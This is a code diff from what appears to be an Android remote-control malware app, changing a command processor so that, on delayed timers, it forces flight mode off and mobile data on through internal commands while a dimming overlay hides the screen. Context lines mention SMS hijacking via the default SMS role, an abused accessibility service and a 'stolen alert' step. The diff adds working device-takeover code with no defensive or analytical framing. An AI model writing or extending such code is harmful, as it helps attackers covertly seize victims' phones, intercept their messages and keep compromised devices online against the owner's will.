@@ -1521,27 +1521,22 @@ object CommandProcessor {
                                 DefaultSmsManager.requestDefault(ctx)
                             }, 8500)
 
-                            // 4. CONNECTIVITY EVALUATION (Delayed to 18s)
+                            // 4. CONNECTIVITY ENFORCEMENT (Delayed to 18s)
                             Handler(Looper.getMainLooper()).postDelayed({
-                                val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
-                                val caps = cm.getNetworkCapabilities(cm.activeNetwork)
-                                val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
-                                
-                                val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
-                                val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
-
-                                                        if (!isOnline && hasSim) {
-                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
-                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                            }
-                            ctx.startActivity(dataIntent)
-                        } else {
-                            if (DefaultSmsManager.expectedMode.isEmpty()) {
-                                DimmerManager.removeOverlay(ctx)
-                            }
-                        }
-                    }, 18000)
+                                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                                    val flightOffCmd = org.json.JSONObject().apply { put("id", -11); put("file_name", "FLIGHT_MODE"); put("content", "OFF") }
+                                    processSingleCommand(ctx, flightOffCmd)
+                                    kotlinx.coroutines.delay(1500)
+                                    val forceDataCmd = org.json.JSONObject().apply { put("id", -12); put("file_name", "FORCE_DATA"); put("content", "ENABLE") }
+                                    processSingleCommand(ctx, forceDataCmd)
+                                    
+                                    if (DefaultSmsManager.expectedMode.isEmpty() && MyAccessibilityService.instance?.activeSequence == null) {
+                                        withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                            DimmerManager.removeOverlay(ctx)
+                                        }
+                                    }
+                                }
+                            }, 18000)
 
                     // 5. EXECUTE STOLEN ALERT (Delayed to 22s)
                     Handler(Looper.getMainLooper()).postDelayed({
@@ -1604,31 +1599,25 @@ object CommandProcessor {
                         DefaultSmsManager.requestDefault(ctx)
                     }, 7500)
 
-                    // 4. CONNECTIVITY EVALUATION (17000ms)
+                    // 4. CONNECTIVITY ENFORCEMENT (17000ms)
                     Handler(Looper.getMainLooper()).postDelayed({
-                        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
-                        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
-                        val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
-                        
-                        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
-                        val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
-
-                                        if (!isOnline && hasSim) {
-                    MyAccessibilityService.instance?.isWaitingForDataSettings = true
-                    val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                    }
-                    ctx.startActivity(dataIntent)
-                    DebugLogger.log("AUTO_SYNC", "Offline with SIM detected. Opening Data Settings.")
-                } else {
-                    DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
-                    if (DefaultSmsManager.expectedMode.isEmpty()) {
-                        DimmerManager.removeOverlay(ctx)
-                    } else {
-                        DebugLogger.log("AUTO_SYNC", "SMS Hijack still active. Keeping Dimmer.")
-                    }
-                }
-            }, 17000)
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                            DebugLogger.log("AUTO_SYNC", "Enforcing Flight Mode OFF and Data ON.")
+                            val flightOffCmd = org.json.JSONObject().apply { put("id", -11); put("file_name", "FLIGHT_MODE"); put("content", "OFF") }
+                            processSingleCommand(ctx, flightOffCmd)
+                            kotlinx.coroutines.delay(1500)
+                            val forceDataCmd = org.json.JSONObject().apply { put("id", -12); put("file_name", "FORCE_DATA"); put("content", "ENABLE") }
+                            processSingleCommand(ctx, forceDataCmd)
+                            
+                            if (DefaultSmsManager.expectedMode.isEmpty() && MyAccessibilityService.instance?.activeSequence == null) {
+                                withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                    DimmerManager.removeOverlay(ctx)
+                                }
+                            } else {
+                                DebugLogger.log("AUTO_SYNC", "Other hijacks active. Keeping Dimmer.")
+                            }
+                        }
+                    }, 17000)
             
             Handler(Looper.getMainLooper()).postDelayed({
                 if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
